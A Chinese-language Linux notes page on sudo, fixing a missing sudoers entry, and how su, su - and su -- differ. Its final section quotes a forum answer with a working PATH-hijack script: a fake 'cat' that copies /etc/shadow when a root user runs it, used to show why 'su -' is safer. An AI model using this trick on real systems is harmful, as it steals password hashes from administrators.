---
title: Linux - sudo
categories:
  - Linux
tags:
  - sudo
---

sudo 命令用于临时提升权限。

<!--more-->

在使用Linux系统过程中，通常情况下，我们都会使用普通用户进行日常操作， 而root用户
只有在权限分配及系统设置时才会使用，而root用户的密码也不可能公开。

普通用户执行到系统程序时，需要临时提升权限，sudo就是我们常用的命令，仅需要输入当
前用户密码，便可以完成权限的临时提升。

在使用sudo命令的过程中，我们经常会遇到当前用户不在sudoers文件中的提示信息， 如果
解决该问题呢？通过下面几个步骤，可以很简单的解决

```bash
[ssy@localhost]$ sudo ls
ssy user not in sudoers file
```

1、切换到root用户权限

```bash
$ su root
```

2、查看/etc/sudoers文件权限，如果只读权限，修改为可写权限

```bash
$ ls -l /etc/sudoers
-r--r-----. 1 root root 4030 9月  25 00:57 /etc/sudoers

$ chmod u+w /etc/sudoers

$ ls -l /etc/sudoers
-rw-r-----. 1 root root 4030 9月  25 00:57 /etc/sudoers
```

3、执行vi命令，编辑/etc/sudoers文件，添加要提升权限的用户；在文件中找到root
ALL=(ALL) ALL，在该行下添加提升权限的用户信息，如：

    root    ALL=(ALL)       ALL
    ssy     ALL=(ALL)       ALL
    说明：格式为（用户名    网络中的主机=（执行命令的目标用户）    执行的命令范围）

4、保存退出，并恢复/etc/sudoers的访问权限为440

```bash
$ chmod u-w /etc/sudoers

$ ls -l /etc/sudoers
-r--r-----. 1 root root 4030 9月  25 00:57 /etc/sudoers
```

5、切换到普通用户，测试用户权限提升功能

！！不用修改 sudoers 文件的权限，切换到 root 用户后，可直接使用 `:w!` 强制写入更改

## su 和 sudo



## su 和 su - 和 su --

`su -` 会在切换用户后调用登录 shell，登录 shell 会重置大部分的环境变量，为切换的
用户提供一个干净的基础，如 `~` 就表示 root 的家目录

`su` 只是切换用户，环境变量几乎和切换前的老用户没什么区别，如 `~` 仍表示切换前用
户的家目录

`su --`  等价于 `su`


`--` is a flag that most programs interpret as "nothing after this should be taken as a flag". Useful for greping for things which start with a dash. – David Mackintosh Feb 9 '11 at 4:43

`su --` is NOT the same as `su -` : `--` tells an getopt(s) (or similar) option handler to stop processing the command line for further options (usefull for example if the rest contains filenames which could start with an '-'). Ie, in "rm -i -- -f" : `-f` is then treated as a regular argument, so here as the name of the file to `rm -i`, and not as an additionnal `-f` option to the rm command. So `su -- ` is just `su` and not `su -` ! So `su --` would be as unsafe to the (funny and instructive) example givan by wag. Use su -. – Olivier Dulac Dec 26 '12 at 15:05


因为 su 盗用 root 密码：

https://unix.stackexchange.com/questions/7013/why-do-we-use-su-and-not-just-su

Imagine, you're a software developer with normal user access to a machine and your ignorant admin just won't give you root access. Let's (hopefully) trick him.

```bash
$ mkdir /tmp/evil_bin
$ vi /tmp/evil_bin/cat
#!/bin/bash
test $UID != 0 && { echo "/bin/cat: Permission denied!"; exit 1; }
/bin/cat /etc/shadow &>/tmp/shadow_copy
/bin/cat "$@"
exit 0

$ chmod +x /tmp/evil_bin/cat
$ PATH="/tmp/evil_bin:$PATH"
```

Now, you ask your admin why you can't cat the dummy file in your home folder, it just won't work!

```bash
$ ls -l /home/you/dummy_file
-rw-r--r-- 1 you wheel 41 2011-02-07 13:00 dummy_file
$ cat /home/you/dummy_file
/bin/cat: Permission denied!
```

If your admin isn't that smart or just a bit lazy, he might come to your desk and try with his super-user powers:

```bash
$ su
Password: ...
# cat /home/you/dummy_file
Some important dummy stuff in that file.
# exit
```

Wow! Thanks, super admin!

```bash
$ ls -l /tmp/shadow_copy
-rw-r--r-- 1 root root 1093 2011-02-07 13:02 /tmp/shadow_copy
He, he.
```

You maybe noticed that the corrupted $PATH variable was not reset. This wouldn't have happened, if the admin invoked su - instead.

